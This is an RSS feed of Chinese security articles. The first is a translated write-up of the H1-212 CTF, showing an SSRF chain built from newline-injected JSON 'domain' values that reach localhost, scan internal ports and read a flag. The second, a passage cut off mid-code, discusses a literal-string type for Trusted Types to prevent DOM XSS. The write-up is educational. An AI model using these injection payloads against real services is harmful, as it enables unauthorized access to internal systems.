<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>Twosecurity</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/</link>
<description>twosecurity.io</description>
<language>zh-cn</language>
<lastBuildDate>Sat, 25 Nov 2017 22:13:29 +0800</lastBuildDate>
<item>
<title>H1-212 CTF writeup</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-11-25-31386355.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;H1-212 CTF writeup&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31386355&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5b18cdd62aeead010f1748e71463bf10_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;介绍&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;acme.org 的工程师在 https://104.236.20.43/ 上推出了新管理面板的新服务器。他坚信他的服务器不会被黑客攻击。他在里面设置了一个“机关”，一旦 flag 文件被读取他就会知道。他也提到 apache 的默认页面也在那儿，不过是他有意为之并无什么特殊意义。你的目标是什么呢？得到 flag !&lt;/p&gt;&lt;p&gt;Time to hack!&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e591ed7a8f94dfb1a2de49bc7048491b_r.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;320&quot; data-rawheight=&quot;240&quot; data-thumbnail=&quot;https://pic4.zhimg.com/v2-e591ed7a8f94dfb1a2de49bc7048491b_b.jpg&quot;&gt;&lt;h2&gt;&lt;b&gt;目标侦查 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在真正攻击之前，我首先是尽可能多的收集关于目标的信息。这些步骤包括对主机运行一些简单的命令，像 host 、 dig 、nslookup 等。然后，我在 shodan 上搜索了 Ip，使用了一些 google 搜索语法，尝试了 DNS 反向域名查找，构成了我信息收集的过程。不出所料，果然开放了 22 和 80 端口。而此时我正在进行被动侦查阶段，并记录下我的发现。&lt;/p&gt;&lt;p&gt;现在是时候与主机直接交互了。我在 nmap 上展开了完整的 TCP 扫描以确定是否有其他端口开放，结果证明只开放了 22 和 80 端口。在扫描过程中，我浏览了这个网站，发现了有名的 apache 默认页面，但是正如 acme.org 的工程师提到的，这是故意的并无其它含义。另外，主机还泄露了 web 服务器的版本：apache v2.4.18，并且运行在 Ubuntu 的发行版本上。为了最精彩的部分，我仔细阅读了 apache 默认页面，企图找到蛛丝马迹，但都无济于事。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;打破常规 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;为了这个得到 flag，我打算穷尽自己储备的知识并进行不懈的尝试！如果你不敢打破常规、大胆尝试，那你还算是个黑客吗？&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-35950b06117f82535ef577f0d80cc9f0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;533&quot;&gt;&lt;p&gt;&lt;a href=&quot;https://twitter.com/jobertabma/status/930273559946989569&quot;&gt;Jobert 的话&lt;/a&gt; 引起了我的注意：CTF 中爆破服务器并不是解决问题的关键。&lt;/p&gt;&lt;blockquote&gt;大约12小时前，我们推出了一场CTF，为了赢得H1-212（NYC）12月份的入场券，与全球顶尖的黑客切磋。从那时起，34,921,283个请求发送到服务器。但只有两个人解决了这个问题。&lt;b&gt;也许暴力破解不是解决问题的关键&lt;/b&gt;。&lt;/blockquote&gt;&lt;p&gt;虽然不抱任何希望，我还是决定使用 burpsuite 的 intruder 模块跑几个字典试试。其中一个字典是我用 ceWL 自定义生成的。CTF 中我大多数情况见到是文件和目录名都被隐藏在主页里面。&lt;/p&gt;&lt;p&gt;在发送了几千个 HTTP 请求之后，唯一发现的是 /flag 这个目录。在看到文件内容之前我猜想，不出意外里面可能是：&lt;/p&gt;&lt;blockquote&gt;真的认为有这么简单吗？继续挖掘吧！&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;改变战略&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;疯狂就是一遍又一遍地做同样的事情，却期待着不同的结果。&lt;/blockquote&gt;&lt;p&gt;此刻，我感觉自己什么也做不了。运行自动化工具可能也不会有任何发现。以我过去 CTF 的经验来看，题目的描述内容或许隐藏着线索。当我重读题目后发现了这么几个问题:&lt;/p&gt;&lt;p&gt;1. 为什么要提到 acme.org ？&lt;/p&gt;&lt;p&gt;2. 这和真实的域名 acme.org 有何联系？&lt;/p&gt;&lt;p&gt;3. 难道服务器是运行在指向 acme.org 的虚拟主机上？&lt;/p&gt;&lt;p&gt;4. 为什么他们要提到一个 admin panel ？&lt;/p&gt;&lt;p&gt;5. 这儿有个叫 admin.acme.org 的虚拟主机？&lt;/p&gt;&lt;p&gt;现在是时候揭晓答案了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;虚拟主机发现&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这里我打算编写一个快速的脚本来枚举虚拟主机，但当我想起了Jobert的&lt;a href=&quot;https://github.com/jobertabma/virtual-host-discovery&quot;&gt;虚拟主机扫描&lt;/a&gt;工具，我又确保添加了 104.236.20.43 到 /etc/hosts 中，关键字 admin 就在这款工具的字典列表里并且可以触发它。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8d3e30043cba9e16c554ab065e7e7b9a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;876&quot; data-rawheight=&quot;70&quot;&gt;&lt;h2&gt;&lt;b&gt;Admin panel&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;正如所料，虚拟主机的发现结果变得有意思了，虚拟主机 admin.acme.org 存在并且分配给你一个奇怪的 cookie: admin=no 。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-482deb6775ef62872b7f57b7628f8bcf_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;628&quot; data-rawheight=&quot;331&quot;&gt;&lt;p&gt;正如每个人都会做的一样，我把请求发送到了 repeater ，将 admin=no 改为 admin=yes 。我知道不会这么简单，但是服务器返回了一个 405 Method Not Allowed 。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ff3a99309b78355e80301f57aaf368e5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;584&quot; data-rawheight=&quot;210&quot;&gt;&lt;p&gt;显然，服务器并不支持我的 HTTP GET 请求，那为什么不用一个空的 body 来发送一个 POST 请求呢？此刻，事情就变得有趣了。服务器响应了一个 406 Not Acceptable 错误。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ed734611c54a75e80866b35aa24d7e7e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1262&quot; data-rawheight=&quot;273&quot;&gt;&lt;p&gt;将 cookie 从 admin=yes 转换回 admin=no ，并发送同样的 POST 请求会得到一个 200 OK 的响应。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c1d94a40954191d601324218d040fca3_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1262&quot; data-rawheight=&quot;268&quot;&gt;&lt;p&gt;奇怪的行为。经过一番在线搜索后我发现了 406 Not Acceptable:&lt;/p&gt;&lt;blockquote&gt;根据请求中接收到的主动协商报头字段，目标资源不具有用户代理可接受的当前表示，并且服务器不愿意提供默认表示。&lt;br&gt;来源：&lt;a href=&quot;https://httpstatuses.com/406&quot;&gt;httpstatuses&lt;/a&gt; &lt;/blockquote&gt;&lt;p&gt;我打算用大量不同的值通过 intruder 来 fuzz User-Agent 和 Accept 请求头，但是响应包的大小并没有改变。尽管我也向 &lt;a href=&quot;https://admin.acme.org/&quot;&gt;https://admin.acme.org/&lt;/a&gt; 发送 POST 请求，然而并没有发现其路径下的任何文件。 emmmmm，PHP 可以运行吗？&lt;/p&gt;&lt;p&gt;就是 PHP ！我向 /index.php 发送了 HTTP 请求。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-93d2770951b030135d7615965b5ffdb0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1264&quot; data-rawheight=&quot;271&quot;&gt;&lt;h2&gt;&lt;b&gt;缺失的请求头&lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6d89c1171cdfad78fe2517a0224f8c57_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1262&quot; data-rawheight=&quot;294&quot;&gt;&lt;p&gt;看到来自服务器的 418 I’m a teapot 响应了吗？太奇怪了，我花了数个小时来弄懂它的意图，并向&lt;br&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc2324&quot;&gt;HTCPCP &lt;/a&gt;发送了几种不同的请求。我决定将关注点放在原始的 POST 请求上并仔细分析。&lt;/p&gt;&lt;p&gt;看着这个请求头，我认为这儿好像有什么东西缺失了。实际上，这里是缺了 Content-Type 头。尝试了 application/xml、application/php、text/plain 和 text/html 这几种 MIME 类型之后，我得到了一个 application.json 类型的响应。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;error&quot;:{&quot;body&quot;:&quot;unable to decode&quot;}}&lt;/code&gt;&lt;p&gt;上面的错误表明应用需要一个 json 格式的 body ，发送 body 内容为{}的请求，得到如下的结果&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
{&quot;error&quot;:{&quot;domain&quot;:&quot;required&quot;}} 。&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-df3cea886423c5f7da9f0d9f9aeb1ce4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1265&quot; data-rawheight=&quot;334&quot;&gt;&lt;p&gt;看来需要一个 domain参数，将 body 从 {} 改为 {&quot;domain&quot;:&quot;test123&quot;}，这次产生了不同的错误：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;error&quot;:{&quot;domain&quot;:&quot;incorrect value, .com domain expected&quot;}}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6ebb731104e969c34c64d285c7c14925_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1263&quot; data-rawheight=&quot;341&quot;&gt;&lt;p&gt;期望一个 “.com” 形式的域名。改为 test.com 产生同样的错误。尝试了不同的组合之后发现 &lt;a href=&quot;http://www.test123.com/&quot;&gt;www.test123.com&lt;/a&gt; 得到了不同的响应：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;error&quot;:{&quot;domain&quot;:&quot;incorrect value, sub domain should contain 212&quot;}}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3ee54c5ca5f3da72a816087d8d4ce1d6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1294&quot; data-rawheight=&quot;335&quot;&gt;&lt;h2&gt;&lt;b&gt;神秘的数字&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;所以，子域名必须要包含数字 212 。最后尝试 212.test123.com 终于得到了有用响应：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;next&quot;:&quot;\/read.php?id=0&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-92e5787950556dcf8edb872bcfee3b06_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1261&quot; data-rawheight=&quot;338&quot;&gt;&lt;p&gt;向 /read.php?id=0 发送 GET 请求，返回：{&quot;data&quot;:&quot;}&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8b6bb1f34fd3e0d5859b5fc061e0f257_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1262&quot; data-rawheight=&quot;275&quot;&gt;&lt;p&gt;将 id 增加 1 ，得到相同的结果：{&quot;data&quot;:&quot;}，当id 大于等于2时，得到如下的错误：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;error&quot;:{&quot;row&quot;:&quot;incorrect row&quot;}}&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-00a9f9287cc383b4cfe25545e634cbaf_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1264&quot; data-rawheight=&quot;271&quot;&gt;&lt;p&gt;向 index.php 发送更多的请求 id 值就会依次加 1 。&lt;/p&gt;&lt;p&gt;接下来的思路是 SSRF 。怎样确定服务器会验证我提供的域名呢？出于好奇，我打算用真实存在的域名来测试。&lt;/p&gt;&lt;p&gt;我使用简单的 google 语法 ：site:212.*.com 找到了 212.huelectricbike.com 这个域名。&lt;/p&gt;&lt;p&gt;这次我用新找到的域名：212.huelectricbike.com 向 /index.php 发送 POST 请求。&lt;/p&gt;&lt;p&gt;令我大吃一惊的是：使用新生成的 id 回到 /read.php 页面，竟然出现了一大串 base64 加密的数据。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;data&quot;:&quot;PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIKICAgICAgICAiaHR...&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b2c92c288d96b9f9e5acd341baf7fe3b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1293&quot; data-rawheight=&quot;377&quot;&gt;&lt;p&gt;解码发现这些数据正是 212.huelectricbike.com 主页的源代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;base64 -d &amp;lt;&amp;lt;&amp;lt; PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIKICAgICAgICAiaHR...&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-66da5b17c1a656c00341416bda88d5fc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1223&quot; data-rawheight=&quot;252&quot;&gt;&lt;h2&gt;&lt;b&gt;深入挖掘&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;目前为止，我所得到信息有：&lt;/p&gt;&lt;p&gt;1. 212.*.com 站点对应用程序是有用的；&lt;/p&gt;&lt;p&gt;2. 该应用返回了网站的源码 ；&lt;/p&gt;&lt;p&gt;3. 应用对源码采用了 base64 加密；&lt;/p&gt;&lt;p&gt;4. 应用程序使用会随着每次请求而递增的 id 将加密后的数据存储在一种特殊的文件或数据库中；&lt;/p&gt;&lt;p&gt;5. 向 /index.php?id=ID_HERE 发送 GET 请求是有机会看到加密值的；&lt;/p&gt;&lt;p&gt;6. Id 似乎是为特定 用户生成的，意味着我不能查看别的用后存储的数据，这通过使用不同的 ip 测试得出的；&lt;/p&gt;&lt;p&gt;7. 应用程序似乎有某种正则机制来过滤一些模式和字符。&lt;/p&gt;&lt;p&gt;现在是时候来绕过这些过滤了，在测试了 \ / = - @ . % { } [ ] 这几个字符后，我发现 % 会在域名中被过滤掉：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request body:
{&quot;domain&quot;:&quot;212.huelectricbike%.com.com&quot;}
Response:
{&quot;error&quot;:{&quot;domain&quot;:&quot;domain cannot contain %&quot;}} &lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-38ff680810eefb936ed5ce8e3cb6f8ed_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1264&quot; data-rawheight=&quot;346&quot;&gt;&lt;p&gt;尝试了几种不同的绕过之后，我考虑到了未编码的 CRLF 注入，因为应用只是过滤了 % 而没有过滤 \ 。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Let&#39;s Play Fetch&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果我能用 CRLF 注入绕过过滤并强制应用程序从&lt;a href=&quot;https://0xc0ffee.io/&quot;&gt;我自己的域&lt;/a&gt;返回数据，那会怎么样呢？如果我能成功绕过过滤，我就可以向本地主机发送请求从而得到更多的信息。&lt;/p&gt;&lt;p&gt;在使用我自己的域之前，如果对这个站点进行 CRLF 注入会怎样呢？&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request Body:
{&quot;domain&quot;:&quot;\r\n212.huelectricbike.com&quot;} 
Response:
{&quot;next&quot;:&quot;\/read.php?id=9&quot;} &lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4ae52cde4e0b5d366ccd0d45af1c2aa0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1264&quot; data-rawheight=&quot;340&quot;&gt;&lt;p&gt;Id 从7 到 9 递增了2！我太激动了！这说明发送了2个请求而不是一个。接下来是绕过域名里必需神秘数字 212 。&lt;/p&gt;&lt;p&gt;经过多次失败的尝试，我发现可以绕过程序限定的 212 和.com ,并且意识到其实不需要回车符：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request body:
{&quot;domain&quot;:&quot;212\n0xc0ffee.io\n.com&quot;} 
Response:
{&quot;next&quot;:&quot;\/read.php?id=15&quot;} &lt;/code&gt;&lt;p&gt;漂亮的 GET 请求从目标主机发送到了我自己的服务器上：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-141b99b4407472737b4323677e6b97d2_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;639&quot; data-rawheight=&quot;37&quot;&gt;&lt;p&gt;并且真的返回了主页的源码。这次 id 递增了3，因为应用程序接受了三个请求（212，0xc0ffee.io，.com），显然这次的请求更加吸引我。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-68faca0ae020742fc32034e22f4e9627_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1299&quot; data-rawheight=&quot;562&quot;&gt;&lt;p&gt;实际发生了什么：&lt;/p&gt;&lt;p&gt;1. 212 被程序执行了，也就是换行符被解析执行了；&lt;/p&gt;&lt;p&gt;2. 0xc0ffee.io&lt;br&gt;也被程序执行了，换行符被执行了；&lt;/p&gt;&lt;p&gt;3. .com 也被执行了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;躲猫猫&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;好了，那么 flag 藏在哪儿了呢？正如之前说过的，如果可以绕过过滤那么就能获得来自本地主机的数据。&lt;/p&gt;&lt;p&gt;发送如下的请求不会得到有用的响应：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request body: {&quot;domain&quot;:&quot;212\nlocalhost\n.com&quot;}
Response:
{&quot;error&quot;:{&quot;domain&quot;:&quot;incorrect value, .com domain
expected&quot;}} &lt;/code&gt;&lt;p&gt;然而，过会儿我发现，我所需要的只是在 localhost 旁加一个点：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request body:
{&quot;domain&quot;:&quot;212\nlocalhost.\n.com&quot;} 
Response:
{&quot;next&quot;:&quot;\/read.php?id=21&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3e516f680a16f504323ff93bc034d538_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1329&quot; data-rawheight=&quot;675&quot;&gt;&lt;p&gt;正如上图所示，请求了Localhost:80 并返回 web 服务器的主页。为了确认一下，我发送了 /flag 请求却得到了这个臭名昭著的响应：&lt;/p&gt;&lt;blockquote&gt;You really thought it would be that easy? Keep digging!&lt;/blockquote&gt;&lt;p&gt;Emmmm，好吧，我知道 SSH 端口是开放的虽然不能建立连接，但我可以抓取 banner 信息呀：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request:
{&quot;domain&quot;:&quot;212\nlocalhost.:22\n.com&quot;} Notice the :22 next
to .localhost? 
Response: {&quot;next&quot;:&quot;\/read.php?id=27&quot;} &lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9f8212451d24be23cadd6853e9fc3e69_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1296&quot; data-rawheight=&quot;422&quot;&gt;&lt;p&gt;太棒了，我可以进行端口扫描。有没有开放内部端口呢？是时候打开 intruder 了，我快速生成了一个 0-65535 的数字列表：seq 65535&amp;gt; port.txt&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0cba25630eeadbf25f144cfb237d7a51_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1303&quot; data-rawheight=&quot;464&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-da08f40e7a00f5b13ccb89e39a61f6c3_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;867&quot; data-rawheight=&quot;433&quot;&gt;&lt;p&gt;在 194-200（除了22-80）响应长度都是相同的，我需要再次运行 intruder 但这次针对 read.php?id=ID_HERE 。&lt;/p&gt;&lt;p&gt;每个空的响应 {&quot;data&quot;:&quot;&quot;} 都有 178 个字节，但这里出现了一个210 字节长的响应并且 数据还被 bease64 加密了的：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7792d5afe45acf764e6019098d8af562_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;772&quot; data-rawheight=&quot;176&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e8866ab39d05d86972d77319fd049485_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;712&quot; data-rawheight=&quot;322&quot;&gt;&lt;p&gt;哇，一些内部 HTTP 端口是开放的，现在我需要用得到的正确 id 去连接正确的端口。&lt;/p&gt;&lt;p&gt;当 intruder 向 localhost:1337 发送请求时分配给我的 id 是 2653 。&lt;/p&gt;&lt;h2&gt;问题的结尾&lt;/h2&gt;&lt;p&gt;目前获得信息是：&lt;/p&gt;&lt;p&gt;1. 内部 HTTP 服务器 监听着 1337端口；&lt;/p&gt;&lt;p&gt;2. 主页显示：Hmm, where would it be?&lt;/p&gt;&lt;p&gt;歪，为什么不试试 /flag ，可能在这儿，对吗？&lt;/p&gt;&lt;p&gt;请求 body: {&quot;domain&quot;:&quot;212\nlocalhost.:1337/flag\n.com&quot;}&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0d2ff566803e2900cb9b2f770094eb9c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;624&quot; data-rawheight=&quot;574&quot;&gt;&lt;p&gt;在这儿呢：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;FLAG: 
CF,2dsV\/]fRAYQ.TDEp`w&quot;M(%mU;p9+9FD{Z48X*Jtt{%vS($g7\S):f%=P[Y@nka=&amp;lt;tqhnF&amp;lt;aq=K5:BC@Sb*{[%z&quot;+@yPb/nfFna&amp;lt;e$hv{p8r2[vMMF52y:z/Dh;{6
&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-db62433e049b6242c2429b219b2d175a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;533&quot;&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;无论我能否赢得这场 NYC 之旅，这次的 CTF 都绝对是一次有趣的经历，我很感激自己能有这次练习的机会成为一个更好的 hacker 。我在这次 CTF 中学到的一点是永不放弃（事实上，喝咖啡的休息时间让我有了新思路），同时质疑应用程序中的每个功能。&lt;/p&gt;&lt;p&gt;很开心成为解决这个问题的少数黑客之一！&lt;/p&gt;&lt;p&gt;感谢HackerOne，Jobert Abma和在这个项目上努力工作的其他人。期待更多的挑战。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;原文：https://0xc0ffee.io/writeups/h1-212/&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-11-25-31386355</guid>
<pubDate>Sat, 25 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>脚本中的文本</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-11-21-31237220.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;脚本中的文本&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31237220&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f6cf095389eda3ae9509c3609f39d954_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;动机&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;HTML 的 DOM （文档对象模型）提供了一系列的机制将任意字符串转换为标签（.innerHTML = ...）或代码（scriptEl.innerText =..., el.onclick = ..., etc）。每一种机制都能触发 XSS 攻击，攻击者可以将代码插入到我们不期望的上下文中，导致基于 DOM 的 XSS 攻击，那正是我们一直试图避免的。&lt;/p&gt;&lt;p&gt;一种解决此问题的好方法（&lt;a href=&quot;https://research.google.com/pubs/pub42934.html&quot;&gt;谷歌也在使用&lt;/a&gt;）是移除基于字符串的 API ，而是使用强类型的接口，它会在应用程序进入时进行强制的检测和过滤。如果开发人员将自己置身于这种体系之中，他们将不必深入审查每种 XSS 接收器的用法，从而有更多的精力去关注生成类型对象的代码，如： SafeHtml 或 SafeUrl 。&lt;a href=&quot;https://github.com/mikewest/trusted-types&quot;&gt;可信类型&lt;/a&gt;的策略就是为了做到这点。&lt;/p&gt;&lt;p&gt;在大多数情况下，这种机制可以完全可以在 DOM 和 &lt;a href=&quot;https://en.wikipedia.org/wiki/Web_IDL&quot;&gt;WebIDL&lt;/a&gt;（web接口定义语言） 中实现，不需要触及底层的语言。然而，谷歌内部的安全审查员发现，如果没有语言层面的 hook ，很难在网络上进行复制。&lt;/p&gt;&lt;p&gt;Closure 编译器可以分辨作为文本嵌入到程序中的字符串，以及作为某些操作（方法调用，属性获取等）的结果的字符串。它强制约束类 &lt;a href=&quot;https://google.github.io/closure-library/api/goog.string.Const.html&quot;&gt;goog.string.Const&lt;/a&gt; ，从而保证对象只能由文本创建，这在谷歌的生产代码中是相当常见的，也被证明是安全的（在没有直接注入脚本的情况下攻击者是不能控制文本的值的）。&lt;/p&gt;&lt;p&gt;也就是说，开发人员可以先创建一个 goog.string.Const，接着生成一个 SafeUrl 对象，然后在工厂方法中使用：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;const url = goog.string.Const.from(&quot;https://safe.test/totally/safe/url&quot;);
return SafeUrl.fromConstant(url);&lt;/code&gt;&lt;p&gt;如果能在平台上应用这个断言，而不是完全依赖基于时间的检测，那将是十分有用的。客户端的 断言能够提高检测的稳健性，进行深度的防御，从而建立一个安全的网络，尤其是代码在程序发布后不经编译偷偷溜走的情况下。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;建议&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我没有足够的语言背景来给出可靠的建议。相反，我有上面的用例，以及我想从平台方面看到的模糊草图。我很乐意从真正了解这方面语言特性的人那里得到反馈。&lt;/p&gt;&lt;p&gt;考虑到这一点：关于可能合理也可能不合理的猜测如下！&lt;/p&gt;&lt;h2&gt;&lt;b&gt;文本字符串类型&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;一种方法是使用一种与文本字符串相对应的新的字符串类型，WebIDL 可以在其之上建立一种新的字符串类型，以便在执行类型检查时区分文本类型。也就是说，今天我们可以生成如下的WebIDL 代码片段：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;interface TrustedHTML {
 static TrustedHTML escape(DOMString html);
}; &lt;/code&gt;&lt;p&gt;这个接口可以这样调用：TrustedHTML.escape(&quot;Literalstring!&quot;)，并且 调用TrustedHTML.escape(formField.value) 可以根据需要转义字符串。&lt;/p&gt;&lt;p&gt;理想情况下我们可以添加如下内容：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;interface TrustedHTML { 
 static TrustedHTML createFromLiteral(LiteralString html);
}; &lt;/code&gt;&lt;p&gt;这个接口可以这样调用：TrustedHTML.createFromLiteral(&quot;Literalstring!&quot;)，但调用TrustedHTML.createFromLiteral(formField.value) 会抛出一个 TypeError。&lt;/p&gt;&lt;p&gt;理想情况下，我们还可以将文字与其他文字（在代码库中常见的线宽限制）结合使用。也就是说，我们会允许以下内容：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;TrustedHTML.createFromLiteral(&quot;A marginally longer literal string that seems to keep going &quot; +
                             &quot;and going and going and going. Wow, what a long string.&quot;);&lt;/code&gt;&lt;p&gt;同样理想的情况下，我们会跟踪字符串的字面意思。也就是说，我们会允许以下内容：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;let a = &quot;Literal string!&quot;;
TrustedHTML.createFromLiteral(a);

let b = &quot;Another literal!&quot;;
TrustedHTML.createFromLiteral(a + b);

let c = a + b;
